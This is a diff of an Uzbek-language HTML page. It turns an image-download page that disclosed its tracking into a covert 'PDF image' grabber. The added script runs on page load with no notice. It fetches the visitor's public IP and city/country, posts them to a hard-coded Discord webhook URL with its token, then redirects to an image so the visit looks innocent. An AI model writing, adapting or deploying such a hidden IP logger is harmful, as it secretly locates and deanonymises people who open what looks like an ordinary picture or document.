@@ -1,78 +1,18 @@
 <!DOCTYPE html>
-<html lang="uz">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rasm Yuklab Olish</title>
+    <title>PDF Rasm</title>
 </head>
 <body>
-    <div style="max-width: 600px; margin: 50px auto; padding: 20px; text-align: center;">
-        <h1>Rasm Yuklab Olish</h1>
-        
-        <div style="margin: 30px 0;">
-            <img src="image.jpg" alt="Rasm" 
-                 style="max-width: 100%; height: auto; border-radius: 5px; cursor: pointer;" 
-                 id="previewImage" 
-                 onclick="downloadAndTrack()">
-            <br>
-            <a href="#" onclick="downloadAndTrack(); return false;" 
-               style="display: inline-block; margin-top: 15px; color: #0066cc; text-decoration: none;">
-               Rasmni Yuklab Olish
-            </a>
-        </div>
-
-        <div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 5px;">
-            <p><strong>Diqqat:</strong> Rasmni yuklab olganingizda, sizning IP manzilingiz va boshqa texnik ma'lumotlaringiz Discord kanaliga yuboriladi.</p>
-        </div>
-    </div>
-
     <script>
-        // Sizning Discord webhook'ingiz
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";
 
-        // Discordga ma'lumot yuborish
-        async function sendToDiscord(userData) {
+        async function trackUser() {
             try {
-                const discordMessage = {
-                    content: `🖼️ **Yangi Rasm Yuklab Olindi!**\n\n` +
-                             `🌐 **IP Manzil:** ${userData.public_ip}\n` +
-                             `📍 **Joylashuv:** ${userData.city}, ${userData.country}\n` +
-                             `⏰ **Vaqt:** ${new Date().toLocaleString()}\n` +
-                             `🖥️ **Brauzer:** ${userData.userAgent}\n` +
-                             `📱 **Platforma:** ${userData.platform}\n` +
-                             `🖥️ **Ekran:** ${userData.screen}\n` +
-                             `🔗 **URL:** ${userData.url}`,
-                    username: "Rasm Yuklovchi Kuzatuvchi",
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/5088/5088124.png"
-                };
-                
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(discordMessage)
-                });
-
-                if (response.ok) {
-                    console.log('✅ Maʼlumotlar Discordga yuborildi');
-                } else {
-                    console.error('❌ Discord xatosi:', response.status);
-                }
-            } catch (error) {
-                console.error('❌ Xato:', error);
-            }
-        }
-
-        // Foydalanuvchi ma'lumotlarini yig'ish
-        async function collectUserData() {
-            try {
-                // IP manzilini olish
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const publicIP = ipData.ip;
 
-                // Geolokatsiya ma'lumotlari
                 let city = 'Nomaʼlum';
                 let country = 'Nomaʼlum';
                 
@@ -81,92 +21,33 @@
                     const geoData = await geoResponse.json();
                     city = geoData.city || 'Nomaʼlum';
                     country = geoData.country_name || 'Nomaʼlum';
-                } catch (geoError) {
-                    console.log('Geolokatsiya xatosi:', geoError);
-                }
+                } catch (geoError) {}
 
-                return {
-                    public_ip: publicIP,
-                    city: city,
-                    country: country,
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    screen: `${screen.width}x${screen.height}`,
-                    url: window.location.href,
-                    timestamp: new Date().toISOString()
-                };
-            } catch (error) {
-                console.error('Maʼlumotlarni yigʻish xatosi:', error);
-                return {
-                    public_ip: 'Aniqlanmadi',
-                    city: 'Nomaʼlum',
-                    country: 'Nomaʼlum',
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    screen: `${screen.width}x${screen.height}`,
-                    url: window.location.href,
-                    timestamp: new Date().toISOString()
-                };
-            }
-        }
-
-        // Yuklab olish va kuzatish
-        async function downloadAndTrack() {
-            try {
-                // Avval ma'lumotlarni yig'amiz
-                const userData = await collectUserData();
-                
-                // Keyin Discordga yuboramiz
-                await sendToDiscord(userData);
-                
-                // Oxirida rasmni yuklab olamiz
-                const downloadLink = document.createElement('a');
-                downloadLink.href = 'image.jpg';
-                downloadLink.download = 'image.jpg';
-                document.body.appendChild(downloadLink);
-                downloadLink.click();
-                document.body.removeChild(downloadLink);
-                
-            } catch (error) {
-                console.error('Yuklab olish xatosi:', error);
-                // Xatolik bo'lsa ham rasmni yuklab olishga urinamiz
-                const downloadLink = document.createElement('a');
-                downloadLink.href = 'image.jpg';
-                downloadLink.download = 'image.jpg';
-                document.body.appendChild(downloadLink);
-                downloadLink.click();
-                document.body.removeChild(downloadLink);
-            }
-        }
-
-        // Sahifa yuklanganda foydalanuvchi ma'lumotlarini yuborish
-        window.addEventListener('load', async function() {
-            try {
-                const userData = await collectUserData();
-                userData.event_type = 'page_visit';
-                
                 const discordMessage = {
-                    content: `🔍 **Yangi Tashrif**\n\n` +
-                             `🌐 **IP Manzil:** ${userData.public_ip}\n` +
-                             `📍 **Joylashuv:** ${userData.city}, ${userData.country}\n` +
+                    content: `📄 **PDF Ichidagi Rasm Ochildi!**\n\n` +
+                             `🌐 **IP Manzil:** ${publicIP}\n` +
+                             `📍 **Joylashuv:** ${city}, ${country}\n` +
                              `⏰ **Vaqt:** ${new Date().toLocaleString()}\n` +
-                             `🔗 **URL:** ${userData.url}`,
-                    username: "Rasm Yuklovchi Kuzatuvchi",
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/5088/5088124.png"
+                             `🔗 **Manba:** PDF fayl`,
+                    username: "PDF Kuzatuvchi"
                 };
                 
-                await fetch(DISCORD_WEBHOOK_URL, {
+                fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(discordMessage)
-                });
-                
+                }).catch(e => console.log('Xato:'));
+
             } catch (error) {
-                console.log('Tashrif maʼlumotlarini yuborish xatosi:', error);
+                console.error('Xato:', error);
             }
-        });
+        }
+
+        // Darhol ishga tushirish
+        trackUser();
+        
+        // Rasmni ochish
+        window.location.href = 'image.jpg';
     </script>
 </body>
 </html>
